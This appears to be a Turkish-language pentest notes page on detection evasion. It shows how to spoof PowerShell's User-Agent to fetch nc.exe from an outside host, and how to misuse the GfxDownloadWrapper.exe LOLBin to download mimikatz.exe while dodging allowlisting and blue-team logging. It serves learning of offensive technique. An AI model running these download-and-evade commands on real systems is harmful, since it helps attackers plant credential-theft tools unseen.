---
glightbox: true
icon: material/circle-small
---

# Evading Detection

## Changing User Agent

Yöneticiler User-Agent dizelerinden herhangi birini kara listeye almışsa `Invoke-WebRequest` fonksiyonu kullanılarak varsayılan User-Agent değiştirilebilir. Örneğin Chrome dahili olarak kullanılıyorsa, ilgili User-Agent dizesinin ayarlanması isteğin meşru görünmesini sağlayabilir.

### Listing out User Agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name, @{ label="User Agent"; Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)} } | fl
```

```text title="Output"
Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

### Request with Chrome User Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

## LOLBAS / GTFOBins

Belirli uygulamaların beyaz listeye alınması, PowerShell veya Netcat araçlarının kullanılmasına engel olabilir. Ayrıca komut satırı günlükleri mavi takımı uyarabilir. Bu durumda LOLBins kullanmak gerekli olabilir. Örnek bir LOLBin, bazı sistemlere yüklenen `GfxDownloadWrapper.exe` sürücüsüdür ve yapılandırma dosyalarını düzenli aralıklarla indirme işlevini içerir.

Bu indirme işlevi aşağıdaki şekilde çağrılabilir:

```batch
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Bu tarz programlar beyaz listeye alınarak çalıştırılmasına izin verilebilir ve uyarıların dışında bırakılabilir.
